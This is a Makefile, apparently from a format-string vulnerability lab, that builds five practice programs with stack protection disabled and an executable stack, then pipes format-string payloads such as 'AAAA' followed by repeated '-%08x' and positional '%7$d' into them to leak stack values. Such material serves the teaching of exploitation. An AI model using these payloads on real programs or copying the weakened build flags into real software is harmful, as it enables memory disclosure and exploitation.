
CFLAGS = -m32 -fno-stack-protector -z execstack -Wno-implicit-function-declaration

files = $(find *.c)

all: clean compile solve


compile:
	gcc $(CFLAGS) 0-read.c -o 0-read.exe
	gcc $(CFLAGS) 1-short-read.c -o 1-short-read.exe
	gcc $(CFLAGS) 2-write.c -o 2-write.exe
	gcc $(CFLAGS) 3-functions.c -o 3-functions.exe
	gcc $(CFLAGS) 4-return.c -o 4-return.exe


solve:
	@echo "\n0"
	python -c 'print "AAAA"+"-%08x"*20+"_%7\x24d"' | ./0-read.exe

	@echo "\n1"
	python -c 'print "_%4\x24d"' | ./1-short-read.exe

	@echo "\n0"
	python -c 'print "_%7\x24d"' | ./2-write.exe


	@echo

clean:
	rm -f *.exe

